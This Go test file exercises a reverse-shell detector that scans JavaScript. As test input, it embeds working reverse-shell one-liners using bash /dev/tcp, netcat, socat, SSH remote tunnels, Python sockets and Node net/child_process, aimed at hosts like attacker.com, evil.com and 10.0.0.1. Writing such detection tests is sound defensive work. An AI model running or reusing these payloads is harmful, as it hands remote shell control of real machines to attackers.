package analyzer

import (
	"strings"
	"testing"
)

func TestReverseShell_BashDevTcp(t *testing.T) {
	a := NewReverseShellAnalyzer()
	content := `
const { exec } = require('child_process');
exec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
`
	findings := a.scanContent(content, "shell.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "reverse shell") || strings.Contains(f.Title, "/dev/tcp") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected critical severity, got %d", f.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("Expected to detect bash /dev/tcp reverse shell")
	}
}

func TestReverseShell_NetcatExec(t *testing.T) {
	a := NewReverseShellAnalyzer()
	content := `
execSync('nc -e /bin/sh attacker.com 4444');
`
	findings := a.scanContent(content, "nc.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Netcat") || strings.Contains(f.Title, "netcat") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect netcat reverse shell")
	}
}

func TestReverseShell_NodeNetChildProcess(t *testing.T) {
	a := NewReverseShellAnalyzer()
	content := `
const net = require('net');
const { spawn } = require('child_process');
const client = net.createConnection({ port: 4444, host: 'evil.com' }, () => {
  const sh = spawn('/bin/sh');
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
});
`
	findings := a.scanContent(content, "revshell.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "net") && strings.Contains(f.Title, "child_process") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect Node.js net+child_process reverse shell")
	}
}

func TestReverseShell_SSHReverseTunnel(t *testing.T) {
	a := NewReverseShellAnalyzer()
	content := `
const { exec } = require('child_process');
exec('ssh -N -R 0:localhost:22 user@attacker.com');
`
	findings := a.scanContent(content, "tunnel.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "SSH reverse tunnel") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected critical severity, got %d", f.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("Expected to detect SSH reverse tunnel")
	}
}

func TestReverseShell_PythonFromNode(t *testing.T) {
	a := NewReverseShellAnalyzer()
	content := `
exec("python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno())'");
`
	findings := a.scanContent(content, "py_shell.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Python reverse shell") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect Python reverse shell from Node")
	}
}

func TestReverseShell_PipeToStdin(t *testing.T) {
	a := NewReverseShellAnalyzer()
	content := `
const net = require('net');
const { spawn } = require('child_process');
const sh = spawn('/bin/sh');
const socket = net.connect(4444, '10.0.0.1');
socket.pipe(sh.stdin);
sh.stdout.pipe(socket);
`
	findings := a.scanContent(content, "pipe.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "pipe") || strings.Contains(f.Title, "Shell process") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect socket-to-process pipe pattern")
	}
}

func TestReverseShell_SocatExec(t *testing.T) {
	a := NewReverseShellAnalyzer()
	content := `
execSync('socat TCP:attacker.com:4444 exec:/bin/sh');
`
	findings := a.scanContent(content, "socat.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Socat") || strings.Contains(f.Title, "socat") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect socat reverse shell")
	}
}

func TestReverseShell_CleanCode(t *testing.T) {
	a := NewReverseShellAnalyzer()
	content := `
const http = require('http');
http.createServer((req, res) => {
  res.writeHead(200);
  res.end('hello');
}).listen(3000);
`
	findings := a.scanContent(content, "server.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity finding in clean code: %s", f.Title)
		}
	}
}
